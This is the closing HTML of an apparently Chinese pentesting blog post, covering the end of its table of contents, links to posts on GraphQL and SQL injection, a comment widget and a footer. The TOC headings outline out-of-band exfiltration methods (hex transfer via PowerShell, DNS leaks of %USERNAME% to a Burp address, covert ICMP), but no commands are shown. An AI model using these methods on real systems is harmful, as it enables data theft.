href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E4%BC%A0%E8%BE%93%EF%BC%9A%EF%BC%88hex%EF%BC%89%E2%80%93%E7%BC%BA%E7%82%B9%EF%BC%9A%E5%BF%85%E9%A1%BB%E8%B0%83%E7%94%A8powershell"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">十六进制传输：（hex）–缺点：必须调用powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87win-r%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%85%A5-USERNAME-%E8%B0%83%E7%94%A8Burp%E5%9C%B0%E5%9D%80%E6%9D%A5%E8%B0%83%E7%94%A8DNS%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95"><span class="toc-number">2.5.2.3.</span> <span class="toc-text">通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP%E4%BC%A0%E8%BE%93%EF%BC%88%E4%B8%8D%E8%83%BD%E4%BC%A0%E5%A4%AA%E5%A4%A7%E7%9A%84%E5%8C%85%EF%BC%8C%E5%9B%9E%E6%98%BE%E4%BF%A1%E6%81%AF%E5%A4%AA%E9%95%BF%E4%BC%9A%E5%A4%B1%E8%B4%A5%EF%BC%8C%E4%BD%86%E4%BE%9D%E6%97%A7%E9%9A%90%E8%94%BD%EF%BC%89"><span class="toc-number">2.5.2.4.</span> <span class="toc-text">ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）</span></a></li></ol></li></ol></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/">&lt; GraphQL注入</a><a class="next" href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">sql注入绕过方法总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>